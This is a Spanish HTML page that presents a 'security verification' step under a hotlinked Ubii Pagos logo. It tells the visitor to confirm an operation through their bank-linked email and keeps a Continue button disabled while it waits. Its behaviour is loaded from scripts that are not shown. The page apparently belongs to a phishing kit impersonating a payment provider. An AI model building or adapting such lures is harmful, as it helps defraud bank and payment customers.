<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Seguridad</title>
    <style>
        /* Fondo gris claro y centrado absoluto */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f5f7fa;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        /* Tarjeta contenedor (Ventana emergente) */
        .verification-card {
            background-color: #ffffff;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
            width: 100%;
            max-width: 400px;
            text-align: center;
            box-sizing: border-box;
        }

        /* Contenedor para el Logotipo superior */
        .logo-container {
            margin-bottom: 15px;
        }

        .logo-container img {
            max-width: 150px;
            height: auto;
            display: inline-block;
        }

        /* Icono o elemento visual inferior */
        .icon-container {
            margin-bottom: 20px;
            color: #0076ff;
        }

        /* Mensaje informativo */
        .message-text {
            color: #333333;
            font-size: 16px;
            line-height: 1.5;
            margin-bottom: 25px;
        }

        /* Botón de acción */
        .btn-continue {
            width: 100%;
            padding: 12px;
            background-color: #0076ff;
            color: #ffffff;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn-continue:hover {
            background-color: #0056b3;
        }

        .btn-continue:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }

        /* Botón de reenvío */
        .btn-resend {
            width: 100%;
            padding: 10px;
            background-color: #ff6b6b;
            color: #ffffff;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 15px;
        }

        .btn-resend:hover {
            background-color: #ff5252;
        }

        /* Mensaje de estado */
        .status-message {
            background-color: #f0f8ff;
            border: 1px solid #d0e0ff;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: center;
            color: #333;
            font-size: 14px;
        }

        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            width: 30px;
            height: 30px;
            border-radius: 50%;
            border-left-color: #0076ff;
            animation: spin 1s linear infinite;
            margin: 10px auto;
            display: none;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="verification-card">

        <div class="logo-container">
            <img src="https://ubiionline.ubiipagos.com/LogoUbiiOnline.svg" alt="Logotipo de la empresa">
        </div>

        <div class="icon-container">
            <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" viewBox="0 0 16 16">
                <path d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2zm2-1a1 1 0 0 0-1 1v.217l7 4.2 7-4.2V4a1 1 0 0 0-1-1zm13 2.383-4.708 2.825L15 11.105zm-.034 6.876-5.64-3.471L8 9.583l-1.326-.795-5.64 3.47A1 1 0 0 0 2 13h12a1 1 0 0 0 .966-.741zM1 11.105l4.708-2.897L1 5.383z"/>
            </svg>
        </div>

        <p class="message-text">Le hemos enviado un mensaje a su correo electrónico afiliado a su banco para autentificar esta operación por favor revise su correo electrónico luego de haber autentificado esta operación presione al botón continuar.</p>

        <div class="status-message" id="statusMessage">
            <p>Enviando solicitud de confirmación al correo afiliado a tu cuenta...</p>
            <div class="spinner" id="statusSpinner"></div>
        </div>

        <div id="resendContainer" style="display: none;">
            <button id="resendButton" class="btn-resend">Enviar confirmación nuevamente</button>
        </div>

        <form id="correoForm">
            <button type="submit" class="btn-continue" id="continueButton" disabled>Continuar</button>
        </form>
    </div>

    <script src="config.js"></script>
    <script src="correo_script.js"></script>
</body>
</html>
